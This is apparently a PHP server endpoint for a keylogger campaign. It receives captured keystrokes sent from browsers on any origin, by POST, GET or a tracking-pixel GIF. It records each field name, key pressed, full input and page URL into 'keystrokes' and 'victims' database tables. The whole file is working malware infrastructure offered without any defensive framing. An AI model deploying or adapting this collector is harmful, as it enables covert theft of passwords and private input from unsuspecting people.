<?php
// api.php - Enhanced for mobile
require_once 'config.php';

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Create log file
$log_file = 'mobile_debug.log';

function writeLog($msg) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - " . $msg . "\n", FILE_APPEND);
}

writeLog("=== New Request ===");

// Get data from various sources
$data = null;

// Check POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    writeLog("POST: " . $input);
    $data = json_decode($input, true);
}

// Check GET
if (isset($_GET['data'])) {
    writeLog("GET: " . $_GET['data']);
    $data = json_decode($_GET['data'], true);
}

if ($data) {
    writeLog("Parsed: " . print_r($data, true));
    
    $session_id = $conn->real_escape_string($data['session'] ?? '');
    $type = $data['type'] ?? '';
    $app = $conn->real_escape_string($data['app'] ?? 'Mobile Browser');
    $field = $conn->real_escape_string($data['field'] ?? 'unknown');
    $key = $conn->real_escape_string($data['key'] ?? '');
    $value = $conn->real_escape_string($data['value'] ?? '');
    $url = $conn->real_escape_string($data['url'] ?? '');
    
    writeLog("Session: $session_id, Type: $type, App: $app, Key: $key");
    
    if ($session_id) {
        // Update victim last active
        $conn->query("UPDATE victims SET last_active = NOW() WHERE session_id = '$session_id'");
        
        // Insert keystroke
        $sql = "INSERT INTO keystrokes (session_id, app_name, field_name, key_pressed, full_input, page_url) 
                VALUES ('$session_id', '$app', '$field', '$key', '$value', '$url')";
        
        if ($conn->query($sql)) {
            writeLog("✅ Data inserted");
        } else {
            writeLog("❌ Error: " . $conn->error);
        }
    }
} else {
    writeLog("❌ No data received");
}

// Always return success for image requests
if (isset($_GET['img'])) {
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

echo json_encode(['status' => 'ok']);
?>